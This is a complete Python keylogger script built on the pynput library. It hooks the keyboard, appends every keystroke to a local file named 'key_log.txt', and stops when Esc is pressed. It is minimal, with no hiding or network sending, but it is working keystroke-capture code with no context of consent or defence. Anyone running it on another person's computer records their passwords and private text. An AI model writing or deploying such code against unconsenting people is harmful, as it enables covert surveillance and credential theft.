import pynput
from pynput.keyboard import Key, Listener

# File to save the log
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
